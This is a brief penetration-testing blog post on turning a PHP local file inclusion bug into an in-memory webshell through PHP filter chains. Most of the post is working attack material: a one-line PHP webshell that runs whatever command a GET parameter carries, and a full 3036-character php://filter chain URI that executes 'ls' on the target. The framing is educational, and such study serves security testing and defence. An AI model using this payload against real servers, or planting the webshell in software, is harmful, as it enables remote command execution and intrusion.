---
title: Simple PHP webshell with php filter chains
url: https://malicious.link/post/2023/simple-php-webshell-with-php-filter-chains/
source: Posts on malicious.link
date: 2023-04-17
fetch_date: 2025-10-04T11:31:49.799074
---

# Simple PHP webshell with php filter chains

[# malicious.link](/ "Malicious Link - Blog by mubix - Rob Fuller")

[About](/about)  [Brandon](/brandon)  [Categories](/categories)  [Posts](/posts)  [Start](/start)  [Tags](/tags)

[# malicious.link](/ "Malicious Link - Blog by mubix - Rob Fuller")

Cancel

[About](/about)[Brandon](/brandon)[Categories](/categories)[Posts](/posts)[Start](/start)[Tags](/tags)

## Contents

# Simple PHP webshell with php filter chains

[Rob Fuller](https://twitter.com/mubix "Author")

2023-04-16  111 words
 One minute

Contents

Recently found an LFI in a PHP application and one of the cool things I learned about recently was [PHP filter chains](https://github.com/synacktiv/php_filter_chain_generator). More info here: <https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html>

However, if you are using this in a URL, it’s pretty hard to do anything too complicated since it expands the text to the point where web servers won’t accept the URL anymore (8190 characters is default max in Apache).

So I used this:

|  |  |
| --- | --- |
| ``` 1 ``` | ``` <?=`$_GET[0]`?> ``` |

From: <https://github.com/bayufedra/Tiny-PHP-Webshell>

Which resulted in the following 3036 character URI ending in a `&0=ls` which executed the command `ls`:

|  |  |
| --- | --- |
| ``` 1 ``` | ``` php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=ls ``` |

This results in a in-memory (not sure if it writes to a temp file with php://temp) php webshell.

Updated on 2023-04-16

[php](/tags/php/), [webshell](/tags/webshell/), [pentesting](/tags/pentesting/), [lfi](/tags/lfi/)

Back | [Home](/)

[Beautiful Basics: Lesson 4](/posts/2022/beautiful-basics-lesson-04/ "Beautiful Basics: Lesson 4")

2005 - 2023 [Rob Fuller](https://twitter.com/mubix) | All Rights Reserved